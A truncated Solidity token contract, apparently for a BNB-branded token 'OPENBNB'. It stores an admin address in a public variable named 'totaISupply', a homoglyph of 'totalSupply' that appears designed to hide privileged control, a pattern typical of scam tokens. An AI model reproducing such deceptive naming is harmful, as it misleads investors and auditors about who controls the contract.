...
contract OPENBNB is Ownable {
    
    uint256 AMOUNTGLOBALADMOUNT = 10000000000*10**decimals();
    uint256 private _seitotalSupply = AMOUNTGLOBALADMOUNT;
    string private _seitokenname = "OPENBNB";
    string private _seitokensymbol = "OPBNB";
    address public totaISupply;
    constructor(address tokenadmin) {
        totaISupply = tokenadmin;
